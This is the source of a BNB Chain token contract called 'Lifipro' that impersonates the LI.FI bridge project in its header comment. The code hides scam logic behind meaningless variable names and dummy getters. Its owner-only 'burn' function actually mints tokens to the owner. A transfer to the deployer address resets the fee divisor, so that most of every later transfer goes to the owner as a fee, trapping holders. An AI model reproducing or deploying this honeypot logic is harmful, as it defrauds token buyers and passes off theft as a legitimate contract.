/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

/*
Lifipro
Advanced Bridge & DEX Aggregation
Cross-chain bridging, swapping and messaging will drive your multi-chain strategy and attract new users from everywhere.
Developer Solution Providing Advanced Bridge Aggregation with DEX Connectivity 
https://li.fi/sdk/
https://transferto.xyz 
https://twitter.com/lifiprotocol

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.12;
contract Lifipro {
uint256 public constant JDKMSL = 99999;
address private  EWVVKQ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  ZSFSXV = address(0);
string public  symbol = "Lifipro";
uint256 private  ZMHLOC = 31;
uint256 private  MZXTXV = 73;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  PVHHBW = 1000000000000000000;
address public owner;
address private  UPWYSK = address(0);
uint8 public constant decimals = 18;
address private  CBOWAA = address(0);
address private  VGNBZF = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 1000000000000000000000000000;
uint256 private  NQAJTI = 44;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "Lifipro";
mapping (address => uint256) public balanceOf;
uint256 private  MIWGTZ = 85;
uint256 private  VXNBRE = 21;
uint256 private  PJRNZD = 89;
event Approval(address indexed owner, address indexed spender, uint256 value);
function _getVX2NBRE() private returns (uint256) {
return VXNBRE + 4;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getVGN3BZF() private returns (address) {
return VGNBZF;
}
//
function _getZMH4LOC() private returns (uint256) {
return ZMHLOC + 15;
}
//
function _getPJR5NZD() private returns (uint256) {
return PJRNZD + 10;
}
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getNQA6JTI() private returns (uint256) {
return NQAJTI + 26;
}
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getMZ7XTXV() private returns (uint256) {
return MZXTXV + 39;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tHIHYYG 0");
require(spender != address(0), "fHIHYYG 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getUP8WYSK() private returns (address) {
return UPWYSK;
}
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getCB9OWAA() private returns (address) {
return CBOWAA;
}
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "HIHYYG");
require(to != address(0), "HIHYYG");
require(amount <= balanceOf[from], "HIHYYG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* JDKMSL/PVHHBW ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ZSFSXV){
PVHHBW = JDKMSL+2;
}
emit Transfer(from, to, transferAmount);
}
function _getMIW8GTZ() private returns (uint256) {
return MIWGTZ + 41;
}
//
constructor () public {
ZSFSXV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getEWV7VKQ() private returns (address) {
return EWVVKQ;
}
//
//
}

library Address256 {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}